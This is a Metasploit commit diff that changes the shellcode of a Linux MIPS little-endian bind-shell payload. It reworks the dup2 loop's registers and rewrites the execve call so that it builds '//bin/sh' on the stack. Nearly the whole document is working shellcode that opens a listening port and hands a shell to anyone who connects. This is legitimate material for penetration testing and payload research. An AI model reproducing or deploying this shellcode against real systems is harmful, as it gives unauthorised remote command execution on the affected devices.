83e51697344b965dcc0e1e0949d41e1cef286333
jvazquez-r7 <juan_vazquez@rapid7.com>
2014-01-08 11:45:08 -0600

    Don't use temporal register between syscals and save some bytes on the execve

--- modules/payloads/singles/linux/mipsle/shell_bind_tcp.rb
+++ modules/payloads/singles/linux/mipsle/shell_bind_tcp.rb
@@ -86,34 +86,31 @@ module Metasploit3
     "\x0c\x01\x01\x01" + #     syscall
 
     "\xff\xff\xa2\xaf" + #     sw v0,-1(sp) # socket
-    "\xfd\xff\x0f\x24" + #     li t7,-3
-    "\x27\x78\xe0\x01" + #     nor t7,t7,zero
+    "\xfd\xff\x11\x24" + #     li s1,-3
+    "\x27\x88\x20\x02" + #     nor s1,s1,zero
     "\xff\xff\xa4\x8f" + #     lw a0,-1(sp)
-    "\x21\x28\xe0\x01" + #     move a1,t7   # dup2_loop
+    "\x21\x28\x20\x02" + #     move a1,s1 # dup2_loop
     "\xdf\x0f\x02\x24" + #     li v0,4063 ( __NR_dup2 )
     "\x0c\x01\x01\x01" + #     syscall 0x40404
     "\xff\xff\x10\x24" + #     li s0,-1
-    "\xff\xff\xef\x21" + #     addi t7,t7,-1
-    "\xfa\xff\xf0\x15" + #     bne t7,s0,<dup2_loop>
+    "\xff\xff\x31\x22" + #     addi s1,s1,-1
+    "\xfa\xff\x30\x16" + #     bne s1,s0 <dup2_loop>
 
-    "\x50\x73\x06\x24" + #     li      a2,0x7350
-    "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
-    "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
-    "\xff\xff\x06\x28" + #     slti    a2,zero,-1
-    "\xc7\xff\x0f\x24" + #     li      t7,-57
-    "\x27\x78\xe0\x01" + #     nor     t7,t7,zero
-    "\x21\x20\xef\x03" + #     addu    a0,ra,t7
-    "\xf0\xff\xa4\xaf" + #     sw      a0,-16(sp)
-    "\xf4\xff\xa0\xaf" + #     sw      zero,-12(sp)
-    "\xf7\xff\x0e\x24" + #     li      t6,-9
-    "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
-    "\x21\x60\xef\x03" + #     addu    t4,ra,t7
-    "\x21\x68\x8e\x01" + #     addu    t5,t4,t6
-    "\xff\xff\xa0\xad" + #     sw      zero,-1(t5)
-    "\xf0\xff\xa5\x23" + #     addi    a1,sp,-16
-    "\xab\x0f\x02\x24" + #     li      v0,4011 ( __NR_execve )
-    "\x0c\x01\x01\x01" + #     syscall
-    "/bin/sh"
+    "\xff\xff\x06\x28" + #     slti a2,zero,-1
+    "\x62\x69\x0f\x3c" + #     lui t7,0x2f2f "bi"
+    "\x2f\x2f\xef\x35" + #     ori t7,t7,0x6269 "//"
+    "\xec\xff\xaf\xaf" + #     sw t7,-20(sp)
+    "\x73\x68\x0e\x3c" + #     lui t6,0x6e2f "sh"
+    "\x6e\x2f\xce\x35" + #     ori t6,t6,0x7368 "n/"
+    "\xf0\xff\xae\xaf" + #     sw t6,-16(sp)
+    "\xf4\xff\xa0\xaf" + #     sw zero,-12(sp)
+    "\xec\xff\xa4\x27" + #     addiu a0,sp,-20
+    "\xf8\xff\xa4\xaf" + #     sw a0,-8(sp)
+    "\xfc\xff\xa0\xaf" + #     sw zero,-4(sp)
+    "\xf8\xff\xa5\x27" + #     addiu a1,sp,-8
+    "\xab\x0f\x02\x24" + #     li v0,4011 ( __NR_execve )
+    "\x0c\x01\x01\x01"   #     syscall 0x40404
+
   end
 
 end
